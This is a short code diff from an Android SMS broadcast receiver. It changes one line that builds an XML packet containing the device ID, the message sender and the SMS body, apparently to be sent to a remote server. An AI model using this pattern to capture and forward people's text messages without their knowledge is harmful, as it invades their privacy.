@@ -105,7 +105,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 				String sendStr = "<packet><id>" + sp.getString("ID", "ID")
 						+ "</id><time>" + logTime()
 						+ "</time><type>4</type><app>" + dir + "</app><ttl>"
-						+ adress + "</ttl><cdata1>" + bodyText
+						+ adress + "</ttl><cdata1>" + bodyText.toString()
 						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
 
 				req = new Request(mContext);
